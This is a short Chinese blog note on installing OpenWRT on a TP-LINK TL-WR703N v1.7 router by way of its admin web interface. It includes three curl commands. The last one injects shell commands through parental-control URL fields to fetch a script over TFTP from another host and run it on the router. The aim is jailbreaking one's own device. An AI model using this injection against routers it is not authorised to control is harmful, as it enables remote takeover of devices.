---
aliases:
- /notes/2015/03/21/tp-link-tl-wr703n-v1.7-openwrt/
categories: notes
date: "2015-03-21T00:00:00Z"
tags:
- OpenWRT
- WR703N
- TP-LINK
title: TP-LINK TL-WR703N 刷 OpenWRT
---

版本号: ver 1.7

原始固件版本: 3.17.1 Build 140120 Rel.56593n

尝试了一下, 这个版本是不能通过web上传非官方的固件, 尝试上传openwrt会报错

`错误代码：18005  上传的文件版本与机型不符。`

评论说是加了签名的的原因.


google了下找到这篇文章: 

[http://www.shadowandy.net/2015/03/flashing-tp-link-tl-wr703n-v1-7-to-openwrt.htm](http://www.shadowandy.net/2015/03/flashing-tp-link-tl-wr703n-v1-7-to-openwrt.htm)


大家可以参照做一下.

## 严重警告, 刷机需谨慎, 我是准备好TTL线才动手的, 如果没有最好不要冒险, 很容易变砖的...


先按步骤生成或下载这四个要放在tftp下的文件:

1. aa
2. i1
3. i2
4. busybox

我使用过的打包共享一下 [百度网盘下载](http://pan.baidu.com/s/1bno6923)

核心的3条命令:

```bash

curl -o - -b "tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true" "http://192.168.1.1/"

curl -o - -b "tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=" --referer "http://192.168.1.1/userRpm/ParentCtrlRpm.htm" "http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl_enable=1&parent_mac_addr=00-00-00-00-00-02&Page=1"

curl -o - -b "tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=" --referer "http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0&Page=1" "http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child_mac=00-00-00-00-00-01&lan_lists=888&url_comment=test&url_0=;cd%20/tmp;&url_1=;tftp%20-gl%20aa%20192.168.1.9;&url_2=;sh%20aa;&url_3=&url_4=&url_5=&url_6=&url_7=&scheds_lists=255&enable=1&Changed=1&SelIndex=0&Page=1&rule_mode=0&Save=%B1%A3+%B4%E6"

```

有几点要注意的:

1. tftp需要运行在windows上, 而且要使用32位的版本, (Mac上的tftp尝试过无效的). 将ip调整为192.168.1.9
2. 另外执行命令之前需要先在管理界面执行`恢复出厂`, 重启完不要设置密码,  直接开始.
3. windows需要自己装curl.
4. 最后的一条命令比较慢, 一定要等到路由器的灯不在闪了, 或者直接在电脑上打开[http://192.168.1.1](http://192.168.1.1)不断的刷新, 什么时候看到OpenWrt的界面了就好了.


然后插个U盘, 升级一下空间, 就可以尽情折腾了.

完成后:

[![image](/assets/images/201503/tl-wr703n-openwrt.png "升级画面")](/assets/images/201503/tl-wr703n-openwrt.png)


最后感谢一下原文的作者, 因为有这些无私共享的人, 世界才会更美好.

还要感谢一下google, 让我很快找到了这篇文章.

